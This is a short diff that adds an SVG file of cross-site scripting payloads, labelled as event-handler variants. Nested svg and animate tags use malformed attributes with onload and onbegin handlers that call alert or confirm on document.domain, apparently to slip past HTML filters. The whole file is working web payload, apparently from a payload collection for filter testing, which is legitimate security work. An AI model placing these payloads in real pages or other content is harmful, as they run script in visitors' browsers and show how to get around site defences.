@@ -1,0 +1,8 @@
+<!-- Payload 1: Multiple event handler variants -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+    <svg onx=() onload=(confirm)(1)>
+    <svg on onload=(alert)(document.domain)>
+    <svg on =i onload=alert(domain)>
+    <svg/on%20onload=alert(1)>
+    <animate onbegin=(alert)(document.domain) attributeName=x dur=1s>
+</svg>
